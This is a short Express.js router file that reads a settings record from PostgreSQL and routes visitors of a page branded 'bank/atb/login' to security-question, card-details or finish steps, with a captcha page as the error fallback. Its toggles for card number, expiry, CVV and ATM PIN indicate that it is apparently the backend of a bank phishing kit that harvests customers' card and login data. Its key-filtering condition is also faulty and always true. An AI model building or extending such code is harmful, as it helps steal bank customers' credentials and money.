// userRouter.js
const express = require('express');
const router = express.Router();
const dbConfig = require('../dbConfig');
const { Pool } = require('pg');

const pool = new Pool(dbConfig);

router.get('/login', async (req, res) => {
    try {
        const getId = 1; // Since we're always dealing with the record with id = 1
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
        let count = 0
        let countRmvDetailsPage = 0
        let rmvDetailsPage = false

        Object.keys(result.rows[0].data.settings.atb).forEach(key => {
            if (result.rows[0].data.settings.atb[key] === 'off') {
              count++;
              if(key != 'card' || key != 'exp' || key != 'cvv' || key != 'atm'){
                console.log(key);
                countRmvDetailsPage++;
              } 
            }
        });

        if(countRmvDetailsPage == 10){
            console.log('removeDetails');
            rmvDetailsPage = true
        }
        
        if (result.rows[0].data.settings.atb.qa > 0) {
            res.render('bank/atb/login/index', { navig: "/atb/qst" });
        } else if(count >= 14) {
            res.render('bank/atb/login/index', {navig: "/atb/finish"});
        } else {
            res.render('bank/atb/login/index', { navig: "/atb/details" });
        }


    } catch (error) {
        console.error(error);
        res.render('captcha/index');
    }
})



// Export the router
module.exports = router;
